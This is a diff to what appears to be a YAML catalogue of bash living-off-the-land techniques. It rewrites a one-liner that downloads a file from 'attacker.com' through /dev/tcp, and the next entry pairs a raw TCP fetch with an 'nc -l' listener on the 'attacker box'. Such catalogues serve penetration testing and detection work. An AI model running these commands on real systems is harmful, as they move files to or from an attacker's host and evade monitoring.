@@ -25,7 +25,9 @@ functions:
         export RHOST=attacker.com
         export RPORT=12345
         export LFILE=file_to_get
-        bash -c '(echo -e "GET /$LFILE HTTP/0.9\r\n\r\n" 1>&3 & cat 0<&3) 3<>/dev/tcp/$RHOST/$RPORT | (read i; while [ "$(echo $i | tr -d \"\r\")" != "" ]; do read i; done; cat) > $LFILE'
+        bash -c '{ echo -ne "GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n" 1>&3; cat 0<&3; } \
+            3<>/dev/tcp/$RHOST/$RPORT \
+            | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } > $LFILE'
     - description: Fetch remote file using a TCP connection. Run `nc -l -p 12345 < "file_to_send"` on the attacker box to send the file.
       code: |-
         export RHOST=attacker.com
